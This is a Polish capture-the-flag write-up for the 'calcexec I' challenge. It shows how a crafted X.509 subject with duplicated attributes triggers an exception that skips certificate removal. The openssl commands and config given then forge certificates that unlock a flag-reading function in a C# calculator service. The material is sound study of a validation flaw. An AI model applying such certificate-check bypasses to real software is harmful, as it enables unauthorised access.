## calcexec I (pwn, 200p, 7 solves)

> 2+2 == [5](Calc.exe)?  
> nc 185.82.202.146 1337

### PL
[ENG](#eng-version)

Zadanie to usługa ewaluatora wyrażeń matematycznych napisana w C#. Widzimy, że jedną z funkcji ewalutora jest wypisanie nam flagi.

```csharp
calcEngine.RegisterFunction("FLAG", 0, (p => File.ReadAllText("flag1")));
```

Niestety, konstruktor ewalutora przyjmuje listę dozwolonych funkcji i domyślnie jest ona pusta. Możemy natomiast je podać w certyfikacie x509 w jego dodatkowym rozszerzeniu.

```csharp
X509Extension x509Extension = cert.Extensions["1.1.1337.7331"];
if (x509Extension != null)
	calcEngine = Program.InitCalcEngine(Enumerable.ToArray(
		Enumerable.Select(Encoding.Default.GetString(
			x509Extension.RawData).Split(','), (x => x.Trim()))));
```

Niestety nie możemy wysłać jednak dowolnego certyfikatu. Są one w kilku krokach weryfikowane.

Nie możemy podać certyfikatu o subjekcie już wczytanego:

```csharp
string key = new X509Name(x509Certificate2.Subject).ToString();
if (this.Items.ContainsKey(key))
	throw new Exception("Certificate is already loaded!");
```

Subject certyfikatu musi zawierać podany identifier:
```csharp
return Enumerable.SingleOrDefault(Enumerable.OfType<string>(
	new X509Name(cert.Subject).GetValues(
		new DerObjectIdentifier("2.5.4.1337")))) == "calc.exe";
```

Issuer certyfikatu nie może być nim sam:
```csharp
string name1 = new X509Name(certificateName).ToString();
X509Certificate2 certificateByName = this.Store.FindCertificateByName(name1);
string name2 = new X509Name(certificateByName.Issuer).ToString();
if (name2 == name1)
	return false;
```

Oraz ostatecznie jest sprawdzana jego sygnatura kluczem publicznym wczytanego wcześniej issuera.
```csharp
Asn1Sequence asn1Sequence = new Asn1InputStream(this.Store.FindCertificateByName(name2)
	.GetPublicKey()).ReadObject();
DotNetUtilities.FromX509Certificate(certificateByName).Verify(
	new RsaKeyParameters(false, ((DerInteger) asn1Sequence[0]).Value,
		((DerInteger) asn1Sequence[1]).Value));
```

Jeżeli któryś z checków nie powiedzie się, wczytany certyfikat jest usuwany ze store'a.

Żeby móc wczytać własny certyfikat musimy znaleźć lukę w którymś z powyższych kodów. Dwa ostatnie zamknięte były w bloku try-catch, ale jeżeli udałoby się wywołać wyjątek w jednym z pozostałych to certyfikat nie zostałby usunięty.

Okazuje się, że certyfikaty x509 mogą posiadać wiele identyfikatorów z tą samą nazwą. Jeżeli więc spreparujemy certyfikat z więcej niż jednym identyfikatorem "2.5.4.1337" spowoduje to wyjątek przy wywołaniu `SingleOrDefault()`, które oczekuje co najwyżej jednego elementu.

Gdyby w ten sposób udało się wczytać certyfikat to będziemy mogli stworzyć certyfikat, który przejdzie wszystkie te checki.

```
openssl req -new -nodes -keyout CA.key -subj "/CN=MyCalc/O=MyCalc/OU=MyCalc/calc=MyCalc/calc=MyCalc" > CA.csr
openssl x509 -sha1 -req -signkey CA.key < CA.csr > CA.crt
openssl req -new -nodes -keyout client.key -config config -extensions cert_extensions > client.csr
openssl x509 -extfile config -extensions cert_extensions -sha1 -req -CAkey CA.key -CA CA.crt < client.csr > client.crt 
```

Oraz plik konfiguracyjny dla openssl:

```
oid_section	= new_oids 
[ new_oids ] 
fooname = 2.5.4.1337

[ req ] 
default_bits       = 2048 
distinguished_name = req_distinguished_name 
attributes         = req_attributes 
prompt             = no 
x509_extensions    = cert_extensions

[ req_distinguished_name ] 
fooname = calc.exe
CN = calc.exe
O = calc.exe
emailAddress = calc@asis-ctf.ir
L = Iran
C = IR

[ req_attributes ] 

[ cert_extensions ] 
1.1.1337.7331 = ASN1:UTF8:ABS,ACOS,ASIN,ATAN,ATAN2,CEILING,COS,COSH,EXP,FLOOR,INT,LN,LOG,LOG10,PI,POWER,RAND,RANDBETWEEN,SIGN,SIN,SINH,SQRT,SUM,SUMIF,TAN,TANH,TRUNC,AVERAGE,AVERAGEA,COUNT,COUNTA,COUNTBLANK,COUNTIF,MAX,MAXA,MIN,MINA,STDEV,STDEVA,STDEVP,STDEVPA,VAR,VARA,VARP,VARPA,CHAR,CODE,CONCATENATE,FIND,LEFT,LEN,LOWER,MID,PROPER,READ,REPLACE,REPT,RIGHT,SEARCH,SUBSTITUTE,T,TEXT,TRIM,UPPER,VALUE,WRITE,FLAG
```

W ten sposób przygotowane certyfikaty udaje się wczytać do programu oraz wywołać funkcję FLAG.

`ASIS{e5cb5e25f77c1da6626fb78a48a678f3}`
